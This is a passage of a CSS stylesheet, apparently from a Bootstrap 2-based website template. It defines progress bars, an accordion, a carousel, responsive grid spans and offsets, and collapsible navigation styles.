	background-image: -o-linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);
	background-image: linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);
}
.progress-success .bar,
.progress .bar-success {
	background-color: #5eb95e;
	background-image: -moz-linear-gradient(top,#62c462,#57a957);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#62c462),to(#57a957));
	background-image: -webkit-linear-gradient(top,#62c462,#57a957);
	background-image: -o-linear-gradient(top,#62c462,#57a957);
	background-image: linear-gradient(to bottom,#62c462,#57a957);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff62c462', endColorstr='#ff57a957', GradientType=0);
}
.progress-success.progress-striped .bar,
.progress-striped .bar-success {
	background-color: #62c462;
	background-image: -webkit-gradient(linear,0 100%,100% 0,color-stop(.25,rgba(255,255,255,0.15)),color-stop(.25,transparent),color-stop(.5,transparent),color-stop(.5,rgba(255,255,255,0.15)),color-stop(.75,rgba(255,255,255,0.15)),color-stop(.75,transparent),to(transparent));
	background-image: -webkit-linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);
	background-image: -moz-linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);
	background-image: -o-linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);
	background-image: linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);
}
.progress-info .bar,
.progress .bar-info {
	background-color: #4bb1cf;
	background-image: -moz-linear-gradient(top,#5bc0de,#339bb9);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#5bc0de),to(#339bb9));
	background-image: -webkit-linear-gradient(top,#5bc0de,#339bb9);
	background-image: -o-linear-gradient(top,#5bc0de,#339bb9);
	background-image: linear-gradient(to bottom,#5bc0de,#339bb9);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff5bc0de', endColorstr='#ff339bb9', GradientType=0);
}
.progress-info.progress-striped .bar,
.progress-striped .bar-info {
	background-color: #5bc0de;
	background-image: -webkit-gradient(linear,0 100%,100% 0,color-stop(.25,rgba(255,255,255,0.15)),color-stop(.25,transparent),color-stop(.5,transparent),color-stop(.5,rgba(255,255,255,0.15)),color-stop(.75,rgba(255,255,255,0.15)),color-stop(.75,transparent),to(transparent));
	background-image: -webkit-linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);
	background-image: -moz-linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);
	background-image: -o-linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);
	background-image: linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);
}
.progress-warning .bar,
.progress .bar-warning {
	background-color: #faa732;
	background-image: -moz-linear-gradient(top,#fbb450,#f89406);
	background-image: -webkit-gradient(linear,0 0,0 100%,from(#fbb450),to(#f89406));
	background-image: -webkit-linear-gradient(top,#fbb450,#f89406);
	background-image: -o-linear-gradient(top,#fbb450,#f89406);
	background-image: linear-gradient(to bottom,#fbb450,#f89406);
	background-repeat: repeat-x;
	filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#fffab44f', endColorstr='#fff89406', GradientType=0);
}
.progress-warning.progress-striped .bar,
.progress-striped .bar-warning {
	background-color: #fbb450;
	background-image: -webkit-gradient(linear,0 100%,100% 0,color-stop(.25,rgba(255,255,255,0.15)),color-stop(.25,transparent),color-stop(.5,transparent),color-stop(.5,rgba(255,255,255,0.15)),color-stop(.75,rgba(255,255,255,0.15)),color-stop(.75,transparent),to(transparent));
	background-image: -webkit-linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);
	background-image: -moz-linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);
	background-image: -o-linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);
	background-image: linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent);
}
.accordion {
	margin-bottom: 18px;
}
.accordion-group {
	margin-bottom: 2px;
	border: 1px solid #e5e5e5;
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	border-radius: 4px;
}
.accordion-heading {
	border-bottom: 0;
}
.accordion-heading .accordion-toggle {
	display: block;
	padding: 8px 15px;
}
.accordion-toggle {
	cursor: pointer;
}
.accordion-inner {
	padding: 9px 15px;
	border-top: 1px solid #e5e5e5;
}
.carousel {
	position: relative;
	margin-bottom: 18px;
	line-height: 1;
}
.carousel-inner {
	overflow: hidden;
	width: 100%;
	position: relative;
}
.carousel-inner > .item {
	display: none;
	position: relative;
	-webkit-transition: .6s ease-in-out left;
	-moz-transition: .6s ease-in-out left;
	-o-transition: .6s ease-in-out left;
	transition: .6s ease-in-out left;
}
.carousel-inner > .item > img,
.carousel-inner > .item > a > img {
	display: block;
	line-height: 1;
}
.carousel-inner > .active,
.carousel-inner > .next,
.carousel-inner > .prev {
	display: block;
}
.carousel-inner > .active {
	left: 0;
}
.carousel-inner > .next,
.carousel-inner > .prev {
	position: absolute;
	top: 0;
	width: 100%;
}
.carousel-inner > .next {
	left: 100%;
}
.carousel-inner > .prev {
	left: -100%;
}
.carousel-inner > .next.left,
.carousel-inner > .prev.right {
	left: 0;
}
.carousel-inner > .active.left {
	left: -100%;
}
.carousel-inner > .active.right {
	left: 100%;
}
.carousel-control {
	position: absolute;
	top: 40%;
	left: 15px;
	width: 40px;
	height: 40px;
	margin-top: -20px;
	font-size: 60px;
	font-weight: 100;
	line-height: 30px;
	color: #fff;
	text-align: center;
	background: #222;
	border: 3px solid #fff;
	-webkit-border-radius: 23px;
	-moz-border-radius: 23px;
	border-radius: 23px;
	opacity: 0.5;
	filter: alpha(opacity=50);
}
.carousel-control.right {
	left: auto;
	right: 15px;
}
.carousel-control:hover,
.carousel-control:focus {
	color: #fff;
	text-decoration: none;
	opacity: 0.9;
	filter: alpha(opacity=90);
}
.carousel-indicators {
	position: absolute;
	top: 15px;
	right: 15px;
	z-index: 5;
	margin: 0;
	list-style: none;
}
.carousel-indicators li {
	display: block;
	float: left;
	width: 10px;
	height: 10px;
	margin-left: 5px;
	text-indent: -999px;
	background-color: #ccc;
	background-color: rgba(255,255,255,0.25);
	border-radius: 5px;
}
.carousel-indicators .active {
	background-color: #fff;
}
.carousel-caption {
	position: absolute;
	left: 0;
	right: 0;
	bottom: 0;
	padding: 15px;
	background: #333;
	background: rgba(0,0,0,0.75);
}
.carousel-caption h4,
.carousel-caption p {
	color: #fff;
	line-height: 18px;
}
.carousel-caption h4 {
	margin: 0 0 5px;
}
.carousel-caption p {
	margin-bottom: 0;
}
.hero-unit {
	padding: 60px;
	margin-bottom: 30px;
	font-size: 18px;
	font-weight: 200;
	line-height: 27px;
	color: inherit;
	background-color: #eee;
	-webkit-border-radius: 6px;
	-moz-border-radius: 6px;
	border-radius: 6px;
}
.hero-unit h1 {
	margin-bottom: 0;
	font-size: 60px;
	line-height: 1;
	color: inherit;
	letter-spacing: -1px;
}
.hero-unit li {
	line-height: 27px;
}
.pull-right {
	float: right;
}
.pull-left {
	float: left;
}
.hide {
	display: none;
}
.show {
	display: block;
}
.invisible {
	visibility: hidden;
}
.affix {
	position: fixed;
}
@-ms-viewport {
	width: device-width;
}
.hidden {
	display: none;
	visibility: hidden;
}
.visible-phone {
	display: none !important;
}
.visible-tablet {
	display: none !important;
}
.hidden-desktop {
	display: none !important;
}
.visible-desktop {
	display: inherit !important;
}
@media (min-width: 768px) and (max-width: 979px) {
	.hidden-desktop {
		display: inherit !important;
	}
	.visible-desktop {
		display: none !important;
	}
	.visible-tablet {
		display: inherit !important;
	}
	.hidden-tablet {
		display: none !important;
	}
}
@media (max-width: 767px) {
	.hidden-desktop {
		display: inherit !important;
	}
	.visible-desktop {
		display: none !important;
	}
	.visible-phone {
		display: inherit !important;
	}
	.hidden-phone {
		display: none !important;
	}
}
.visible-print {
	display: none !important;
}
@media print {
	.visible-print {
		display: inherit !important;
	}
	.hidden-print {
		display: none !important;
	}
}
@media (max-width: 767px) {
	body {
		padding-left: 20px;
		padding-right: 20px;
	}
	.navbar-fixed-top,
	.navbar-fixed-bottom,
	.navbar-static-top {
		margin-left: -20px;
		margin-right: -20px;
	}
	.container-fluid {
		padding: 0;
	}
	.dl-horizontal dt {
		float: none;
		clear: none;
		width: auto;
		text-align: left;
	}
	.dl-horizontal dd {
		margin-left: 0;
	}
	.container {
		width: auto;
	}
	.row-fluid {
		width: 100%;
	}
	.row,
	.thumbnails {
		margin-left: 0;
	}
	.thumbnails > li {
		float: none;
		margin-left: 0;
	}
	[class*="span"],
	.uneditable-input[class*="span"],
	.row-fluid [class*="span"] {
		float: none;
		display: block;
		width: 100%;
		margin-left: 0;
		-webkit-box-sizing: border-box;
		-moz-box-sizing: border-box;
		box-sizing: border-box;
	}
	.span12,
	.row-fluid .span12 {
		width: 100%;
		-webkit-box-sizing: border-box;
		-moz-box-sizing: border-box;
		box-sizing: border-box;
	}
	.row-fluid [class*="offset"]:first-child {
		margin-left: 0;
	}
	.input-large,
	.input-xlarge,
	.input-xxlarge,
	input[class*="span"],
	select[class*="span"],
	textarea[class*="span"],
	.uneditable-input {
		display: block;
		width: 100%;
		min-height: 28px;
		-webkit-box-sizing: border-box;
		-moz-box-sizing: border-box;
		box-sizing: border-box;
	}
	.input-prepend input,
	.input-append input,
	.input-prepend input[class*="span"],
	.input-append input[class*="span"] {
		display: inline-block;
		width: auto;
	}
	.controls-row [class*="span"] + [class*="span"] {
		margin-left: 0;
	}
}
@media (max-width: 480px) {
	.nav-collapse {
		-webkit-transform: translate3d(0,0,0);
	}
	.page-header h1 small {
		display: block;
		line-height: 18px;
	}
	input[type="checkbox"],
	input[type="radio"] {
		border: 1px solid #ccc;
	}
	.form-horizontal .control-label {
		float: none;
		width: auto;
		padding-top: 0;
		text-align: left;
	}
	.form-horizontal .controls {
		margin-left: 0;
	}
	.form-horizontal .control-list {
		padding-top: 0;
	}
	.form-horizontal .form-actions {
		padding-left: 10px;
		padding-right: 10px;
	}
	.media .pull-left,
	.media .pull-right {
		float: none;
		display: block;
		margin-bottom: 10px;
	}
	.media-object {
		margin-right: 0;
		margin-left: 0;
	}
	.modal-header .close {
		padding: 10px;
		margin: -10px;
	}
	.carousel-caption {
		position: static;
	}
}
@media (min-width: 768px) and (max-width: 979px) {
	.row {
		margin-left: -20px;
		*zoom: 1;
	}
	.row:before,
	.row:after {
		display: table;
		content: "";
		line-height: 0;
	}
	.row:after {
		clear: both;
	}
	[class*="span"] {
		float: left;
		min-height: 1px;
		margin-left: 20px;
	}
	.container,
	.navbar-static-top .container,
	.navbar-fixed-top .container,
	.navbar-fixed-bottom .container {
		width: 724px;
	}
	.span12 {
		width: 724px;
	}
	.span11 {
		width: 662px;
	}
	.span10 {
		width: 600px;
	}
	.span9 {
		width: 538px;
	}
	.span8 {
		width: 476px;
	}
	.span7 {
		width: 414px;
	}
	.span6 {
		width: 352px;
	}
	.span5 {
		width: 290px;
	}
	.span4 {
		width: 228px;
	}
	.span3 {
		width: 166px;
	}
	.span2 {
		width: 104px;
	}
	.span1 {
		width: 42px;
	}
	.offset12 {
		margin-left: 764px;
	}
	.offset11 {
		margin-left: 702px;
	}
	.offset10 {
		margin-left: 640px;
	}
	.offset9 {
		margin-left: 578px;
	}
	.offset8 {
		margin-left: 516px;
	}
	.offset7 {
		margin-left: 454px;
	}
	.offset6 {
		margin-left: 392px;
	}
	.offset5 {
		margin-left: 330px;
	}
	.offset4 {
		margin-left: 268px;
	}
	.offset3 {
		margin-left: 206px;
	}
	.offset2 {
		margin-left: 144px;
	}
	.offset1 {
		margin-left: 82px;
	}
	.row-fluid {
		width: 100%;
		*zoom: 1;
	}
	.row-fluid:before,
	.row-fluid:after {
		display: table;
		content: "";
		line-height: 0;
	}
	.row-fluid:after {
		clear: both;
	}
	.row-fluid [class*="span"] {
		display: block;
		width: 100%;
		min-height: 28px;
		-webkit-box-sizing: border-box;
		-moz-box-sizing: border-box;
		box-sizing: border-box;
		float: left;
		margin-left: 2.7624309392265%;
		*margin-left: 2.7092394498648%;
	}
	.row-fluid [class*="span"]:first-child {
		margin-left: 0;
	}
	.row-fluid .controls-row [class*="span"] + [class*="span"] {
		margin-left: 2.7624309392265%;
	}
	.row-fluid .span12 {
		width: 100%;
		*width: 99.946808510638%;
	}
	.row-fluid .span11 {
		width: 91.489361702128%;
		*width: 91.436170212766%;
	}
	.row-fluid .span10 {
		width: 82.978723404255%;
		*width: 82.925531914894%;
	}
	.row-fluid .span9 {
		width: 74.468085106383%;
		*width: 74.414893617021%;
	}
	.row-fluid .span8 {
		width: 65.957446808511%;
		*width: 65.904255319149%;
	}
	.row-fluid .span7 {
		width: 57.446808510638%;
		*width: 57.393617021277%;
	}
	.row-fluid .span6 {
		width: 48.936170212766%;
		*width: 48.882978723404%;
	}
	.row-fluid .span5 {
		width: 40.425531914894%;
		*width: 40.372340425532%;
	}
	.row-fluid .span4 {
		width: 31.914893617021%;
		*width: 31.86170212766%;
	}
	.row-fluid .span3 {
		width: 23.404255319149%;
		*width: 23.351063829787%;
	}
	.row-fluid .span2 {
		width: 14.893617021277%;
		*width: 14.840425531915%;
	}
	.row-fluid .span1 {
		width: 6.3829787234043%;
		*width: 6.3297872340426%;
	}
	.row-fluid .offset12 {
		margin-left: 105.52486187845%;
		*margin-left: 105.41847889973%;
	}
	.row-fluid .offset12:first-child {
		margin-left: 102.76243093923%;
		*margin-left: 102.6560479605%;
	}
	.row-fluid .offset11 {
		margin-left: 95.744680851064%;
		*margin-left: 95.63829787234%;
	}
	.row-fluid .offset11:first-child {
		margin-left: 93.617021276596%;
		*margin-left: 93.510638297872%;
	}
	.row-fluid .offset10 {
		margin-left: 87.234042553191%;
		*margin-left: 87.127659574468%;
	}
	.row-fluid .offset10:first-child {
		margin-left: 85.106382978723%;
		*margin-left: 85%;
	}
	.row-fluid .offset9 {
		margin-left: 78.723404255319%;
		*margin-left: 78.617021276596%;
	}
	.row-fluid .offset9:first-child {
		margin-left: 76.595744680851%;
		*margin-left: 76.489361702128%;
	}
	.row-fluid .offset8 {
		margin-left: 70.212765957447%;
		*margin-left: 70.106382978723%;
	}
	.row-fluid .offset8:first-child {
		margin-left: 68.085106382979%;
		*margin-left: 67.978723404255%;
	}
	.row-fluid .offset7 {
		margin-left: 61.702127659574%;
		*margin-left: 61.595744680851%;
	}
	.row-fluid .offset7:first-child {
		margin-left: 59.574468085106%;
		*margin-left: 59.468085106383%;
	}
	.row-fluid .offset6 {
		margin-left: 53.191489361702%;
		*margin-left: 53.085106382979%;
	}
	.row-fluid .offset6:first-child {
		margin-left: 51.063829787234%;
		*margin-left: 50.957446808511%;
	}
	.row-fluid .offset5 {
		margin-left: 44.68085106383%;
		*margin-left: 44.574468085106%;
	}
	.row-fluid .offset5:first-child {
		margin-left: 42.553191489362%;
		*margin-left: 42.446808510638%;
	}
	.row-fluid .offset4 {
		margin-left: 36.170212765957%;
		*margin-left: 36.063829787234%;
	}
	.row-fluid .offset4:first-child {
		margin-left: 34.042553191489%;
		*margin-left: 33.936170212766%;
	}
	.row-fluid .offset3 {
		margin-left: 27.659574468085%;
		*margin-left: 27.553191489362%;
	}
	.row-fluid .offset3:first-child {
		margin-left: 25.531914893617%;
		*margin-left: 25.425531914894%;
	}
	.row-fluid .offset2 {
		margin-left: 19.148936170213%;
		*margin-left: 19.042553191489%;
	}
	.row-fluid .offset2:first-child {
		margin-left: 17.021276595745%;
		*margin-left: 16.914893617021%;
	}
	.row-fluid .offset1 {
		margin-left: 10.63829787234%;
		*margin-left: 10.531914893617%;
	}
	.row-fluid .offset1:first-child {
		margin-left: 8.5106382978723%;
		*margin-left: 8.4042553191489%;
	}
	input,
	textarea,
	.uneditable-input {
		margin-left: 0;
	}
	.controls-row [class*="span"] + [class*="span"] {
		margin-left: 20px;
	}
	input.span12,
	textarea.span12,
	.uneditable-input.span12 {
		width: 710px;
	}
	input.span11,
	textarea.span11,
	.uneditable-input.span11 {
		width: 648px;
	}
	input.span10,
	textarea.span10,
	.uneditable-input.span10 {
		width: 586px;
	}
	input.span9,
	textarea.span9,
	.uneditable-input.span9 {
		width: 524px;
	}
	input.span8,
	textarea.span8,
	.uneditable-input.span8 {
		width: 462px;
	}
	input.span7,
	textarea.span7,
	.uneditable-input.span7 {
		width: 400px;
	}
	input.span6,
	textarea.span6,
	.uneditable-input.span6 {
		width: 338px;
	}
	input.span5,
	textarea.span5,
	.uneditable-input.span5 {
		width: 276px;
	}
	input.span4,
	textarea.span4,
	.uneditable-input.span4 {
		width: 214px;
	}
	input.span3,
	textarea.span3,
	.uneditable-input.span3 {
		width: 152px;
	}
	input.span2,
	textarea.span2,
	.uneditable-input.span2 {
		width: 90px;
	}
	input.span1,
	textarea.span1,
	.uneditable-input.span1 {
		width: 28px;
	}
}
@media (min-width: 1200px) {
	.row {
		margin-left: -30px;
		*zoom: 1;
	}
	.row:before,
	.row:after {
		display: table;
		content: "";
		line-height: 0;
	}
	.row:after {
		clear: both;
	}
	[class*="span"] {
		float: left;
		min-height: 1px;
		margin-left: 30px;
	}
	.container,
	.navbar-static-top .container,
	.navbar-fixed-top .container,
	.navbar-fixed-bottom .container {
		width: 1170px;
	}
	.span12 {
		width: 1170px;
	}
	.span11 {
		width: 1070px;
	}
	.span10 {
		width: 970px;
	}
	.span9 {
		width: 870px;
	}
	.span8 {
		width: 770px;
	}
	.span7 {
		width: 670px;
	}
	.span6 {
		width: 570px;
	}
	.span5 {
		width: 470px;
	}
	.span4 {
		width: 370px;
	}
	.span3 {
		width: 270px;
	}
	.span2 {
		width: 170px;
	}
	.span1 {
		width: 70px;
	}
	.offset12 {
		margin-left: 1230px;
	}
	.offset11 {
		margin-left: 1130px;
	}
	.offset10 {
		margin-left: 1030px;
	}
	.offset9 {
		margin-left: 930px;
	}
	.offset8 {
		margin-left: 830px;
	}
	.offset7 {
		margin-left: 730px;
	}
	.offset6 {
		margin-left: 630px;
	}
	.offset5 {
		margin-left: 530px;
	}
	.offset4 {
		margin-left: 430px;
	}
	.offset3 {
		margin-left: 330px;
	}
	.offset2 {
		margin-left: 230px;
	}
	.offset1 {
		margin-left: 130px;
	}
	.row-fluid {
		width: 100%;
		*zoom: 1;
	}
	.row-fluid:before,
	.row-fluid:after {
		display: table;
		content: "";
		line-height: 0;
	}
	.row-fluid:after {
		clear: both;
	}
	.row-fluid [class*="span"] {
		display: block;
		width: 100%;
		min-height: 28px;
		-webkit-box-sizing: border-box;
		-moz-box-sizing: border-box;
		box-sizing: border-box;
		float: left;
		margin-left: 2.5641025641026%;
		*margin-left: 2.5109110747409%;
	}
	.row-fluid [class*="span"]:first-child {
		margin-left: 0;
	}
	.row-fluid .controls-row [class*="span"] + [class*="span"] {
		margin-left: 2.5641025641026%;
	}
	.row-fluid .span12 {
		width: 100%;
		*width: 99.946808510638%;
	}
	.row-fluid .span11 {
		width: 91.436464088398%;
		*width: 91.383272599036%;
	}
	.row-fluid .span10 {
		width: 82.872928176796%;
		*width: 82.819736687434%;
	}
	.row-fluid .span9 {
		width: 74.309392265193%;
		*width: 74.256200775832%;
	}
	.row-fluid .span8 {
		width: 65.745856353591%;
		*width: 65.692664864229%;
	}
	.row-fluid .span7 {
		width: 57.182320441989%;
		*width: 57.129128952627%;
	}
	.row-fluid .span6 {
		width: 48.618784530387%;
		*width: 48.565593041025%;
	}
	.row-fluid .span5 {
		width: 40.055248618785%;
		*width: 40.002057129423%;
	}
	.row-fluid .span4 {
		width: 31.491712707182%;
		*width: 31.438521217821%;
	}
	.row-fluid .span3 {
		width: 22.92817679558%;
		*width: 22.874985306218%;
	}
	.row-fluid .span2 {
		width: 14.364640883978%;
		*width: 14.311449394616%;
	}
	.row-fluid .span1 {
		width: 5.8011049723757%;
		*width: 5.747913483014%;
	}
	.row-fluid .offset12 {
		margin-left: 105.12820512821%;
		*margin-left: 105.02182214948%;
	}
	.row-fluid .offset12:first-child {
		margin-left: 102.5641025641%;
		*margin-left: 102.45771958538%;
	}
	.row-fluid .offset11 {
		margin-left: 96.961325966851%;
		*margin-left: 96.854942988127%;
	}
	.row-fluid .offset11:first-child {
		margin-left: 94.198895027624%;
		*margin-left: 94.092512048901%;
	}
	.row-fluid .offset10 {
		margin-left: 88.397790055249%;
		*margin-left: 88.291407076525%;
	}
	.row-fluid .offset10:first-child {
		margin-left: 85.635359116022%;
		*margin-left: 85.528976137299%;
	}
	.row-fluid .offset9 {
		margin-left: 79.834254143646%;
		*margin-left: 79.727871164923%;
	}
	.row-fluid .offset9:first-child {
		margin-left: 77.07182320442%;
		*margin-left: 76.965440225696%;
	}
	.row-fluid .offset8 {
		margin-left: 71.270718232044%;
		*margin-left: 71.164335253321%;
	}
	.row-fluid .offset8:first-child {
		margin-left: 68.508287292818%;
		*margin-left: 68.401904314094%;
	}
	.row-fluid .offset7 {
		margin-left: 62.707182320442%;
		*margin-left: 62.600799341719%;
	}
	.row-fluid .offset7:first-child {
		margin-left: 59.944751381215%;
		*margin-left: 59.838368402492%;
	}
	.row-fluid .offset6 {
		margin-left: 54.14364640884%;
		*margin-left: 54.037263430116%;
	}
	.row-fluid .offset6:first-child {
		margin-left: 51.381215469613%;
		*margin-left: 51.27483249089%;
	}
	.row-fluid .offset5 {
		margin-left: 45.580110497238%;
		*margin-left: 45.473727518514%;
	}
	.row-fluid .offset5:first-child {
		margin-left: 42.817679558011%;
		*margin-left: 42.711296579288%;
	}
	.row-fluid .offset4 {
		margin-left: 37.016574585635%;
		*margin-left: 36.910191606912%;
	}
	.row-fluid .offset4:first-child {
		margin-left: 34.254143646409%;
		*margin-left: 34.147760667685%;
	}
	.row-fluid .offset3 {
		margin-left: 28.453038674033%;
		*margin-left: 28.34665569531%;
	}
	.row-fluid .offset3:first-child {
		margin-left: 25.690607734807%;
		*margin-left: 25.584224756083%;
	}
	.row-fluid .offset2 {
		margin-left: 19.889502762431%;
		*margin-left: 19.783119783708%;
	}
	.row-fluid .offset2:first-child {
		margin-left: 17.127071823204%;
		*margin-left: 17.020688844481%;
	}
	.row-fluid .offset1 {
		margin-left: 11.325966850829%;
		*margin-left: 11.219583872105%;
	}
	.row-fluid .offset1:first-child {
		margin-left: 8.5635359116022%;
		*margin-left: 8.4571529328788%;
	}
	input,
	textarea,
	.uneditable-input {
		margin-left: 0;
	}
	.controls-row [class*="span"] + [class*="span"] {
		margin-left: 30px;
	}
	input.span12,
	textarea.span12,
	.uneditable-input.span12 {
		width: 1156px;
	}
	input.span11,
	textarea.span11,
	.uneditable-input.span11 {
		width: 1056px;
	}
	input.span10,
	textarea.span10,
	.uneditable-input.span10 {
		width: 956px;
	}
	input.span9,
	textarea.span9,
	.uneditable-input.span9 {
		width: 856px;
	}
	input.span8,
	textarea.span8,
	.uneditable-input.span8 {
		width: 756px;
	}
	input.span7,
	textarea.span7,
	.uneditable-input.span7 {
		width: 656px;
	}
	input.span6,
	textarea.span6,
	.uneditable-input.span6 {
		width: 556px;
	}
	input.span5,
	textarea.span5,
	.uneditable-input.span5 {
		width: 456px;
	}
	input.span4,
	textarea.span4,
	.uneditable-input.span4 {
		width: 356px;
	}
	input.span3,
	textarea.span3,
	.uneditable-input.span3 {
		width: 256px;
	}
	input.span2,
	textarea.span2,
	.uneditable-input.span2 {
		width: 156px;
	}
	input.span1,
	textarea.span1,
	.uneditable-input.span1 {
		width: 56px;
	}
	.thumbnails {
		margin-left: -30px;
	}
	.thumbnails > li {
		margin-left: 30px;
	}
	.row-fluid .thumbnails {
		margin-left: 0;
	}
}
@media (max-width: 767px) {
	body {
		padding-top: 0;
	}
	.navbar-fixed-top,
	.navbar-fixed-bottom {
		position: static;
	}
	.navbar-fixed-top {
		margin-bottom: 18px;
	}
	.navbar-fixed-bottom {
		margin-top: 18px;
	}
	.navbar-fixed-top .navbar-inner,
	.navbar-fixed-bottom .navbar-inner {
		padding: 5px;
	}
	.navbar .container {
		width: auto;
		padding: 0;
	}
	.navbar .brand {
		padding-left: 10px;
		padding-right: 10px;
		margin: 0 0 0 -5px;
	}
	.nav-collapse {
		clear: both;
	}
	.nav-collapse .nav {
		float: none;
		margin: 0 0 9px;
	}
	.nav-collapse .nav > li {
		float: none;
	}
	.nav-collapse .nav > li > a {
		margin-bottom: 2px;
	}
	.nav-collapse .nav > .divider-vertical {
		display: none;
	}
	.nav-collapse .nav .nav-header {
		color: #555;
		text-shadow: none;
	}
	.nav-collapse .nav > li > a,
	.nav-collapse .dropdown-menu a {
		padding: 9px 15px;
		font-weight: bold;
		color: #555;
		-webkit-border-radius: 3px;
		-moz-border-radius: 3px;
		border-radius: 3px;
	}
	.nav-collapse .btn {
		padding: 4px 10px 4px;
		font-weight: normal;
		-webkit-border-radius: 4px;
		-moz-border-radius: 4px;
		border-radius: 4px;
	}
	.nav-collapse .dropdown-menu li + li a {
		margin-bottom: 2px;
	}
	.nav-collapse .nav > li > a:hover,
	.nav-collapse .nav > li > a:focus,
	.nav-collapse .dropdown-menu a:hover,
	.nav-collapse .dropdown-menu a:focus {
		background-color: #f2f2f2;
	}
	.navbar-inverse .nav-collapse .nav > li > a,
	.navbar-inverse .nav-collapse .dropdown-menu a {
		color: #d9d9d9;
	}
	.navbar-inverse .nav-collapse .nav > li > a:hover,
	.navbar-inverse .nav-collapse .nav > li > a:focus,
	.navbar-inverse .nav-collapse .dropdown-menu a:hover,
	.navbar-inverse .nav-collapse .dropdown-menu a:focus {
		background-color: #10223e;
	}
	.nav-collapse.in .btn-group {
		margin-top: 5px;
		padding: 0;
	}
	.nav-collapse .dropdown-menu {
		position: static;
		top: auto;
		left: auto;
		float: none;
		display: none;
		max-width: none;
		margin: 0 15px;
		padding: 0;
		background-color: transparent;
		border: none;
		-webkit-border-radius: 0;
		-moz-border-radius: 0;
		border-radius: 0;
		-webkit-box-shadow: none;
		-moz-box-shadow: none;
		box-shadow: none;
	}
	.nav-collapse .open > .dropdown-menu {
		display: block;
	}
	.nav-collapse .dropdown-menu:before,
	.nav-collapse .dropdown-menu:after {
		display: none;
	}
	.nav-collapse .dropdown-menu .divider {
		display: none;
	}
	.nav-collapse .nav > li > .dropdown-menu:before,
	.nav-collapse .nav > li > .dropdown-menu:after {
		display: none;
	}
	.nav-collapse .navbar-form,
	.nav-collapse .navbar-search {
		float: none;
		padding: 9px 15px;
		margin: 9px 0;
		border-top: 1px solid #f2f2f2;
		border-bottom: 1px solid #f2f2f2;
		-webkit-box-shadow: inset 0 1px 0 rgba(255,255,255,.1), 0 1px 0 rgba(255,255,255,.1);
		-moz-box-shadow: inset 0 1px 0 rgba(255,255,255,.1), 0 1px 0 rgba(255,255,255,.1);
		box-shadow: inset 0 1px 0 rgba(255,255,255,.1), 0 1px 0 rgba(255,255,255,.1);
	}
	.navbar-inverse .nav-collapse .navbar-form,
	.navbar-inverse .nav-collapse .navbar-search {
		border-top-color: #10223e;
		border-bottom-color: #10223e;
	}
	.navbar .nav-collapse .nav.pull-right {
		float: none;
		margin-left: 0;
	}
	.nav-collapse,
	.nav-collapse.collapse {
		overflow: hidden;
		height: 0;
	}
	.navbar .btn-navbar {
		display: block;
	}
	.navbar-static .navbar-inner {
		padding-left: 10px;
		padding-right: 10px;
	}
}
@media (min-width: 768px) {
	.nav-collapse.collapse {
		height: auto !important;
		overflow: visible !important;
	}
}
.small {
	font-size: 11px;
}
iframe,
svg {
	max-width: 100%;
}
.nowrap {
	white-space: nowrap;
}
.center,
.table td.center,
.table th.center {
	text-align: center;
}
a.disabled,
a.disabled:hover {
	color: #999999;
	background-color: transparent;
	cursor: default;
	text-decoration: none;
}
.hero-unit {
	text-align: center;
}
.hero-unit .lead {
	margin-bottom: 18px;
	font-size: 20px;
	font-weight: 200;
	line-height: 27px;
}
.btn .caret {
	margin-bottom: 7px;
}
.btn.btn-micro .caret {
	margin: 5px 0;
}
.blog-row-rule,
.blog-item-rule {
	border: 0;
}
body.modal {
	padding-top: 0;
}
.row-even,
.row-odd {
	padding: 5px;
	width: 99%;
	border-bottom: 1px solid #ddd;
}
.row-odd {
	background-color: transparent;
}
.row-even {
	background-color: #f9f9f9;
}
.blog-row-rule,
.blog-item-rule {
	border: 0;
}
.row-fluid .row-reveal {
	visibility: hidden;
}
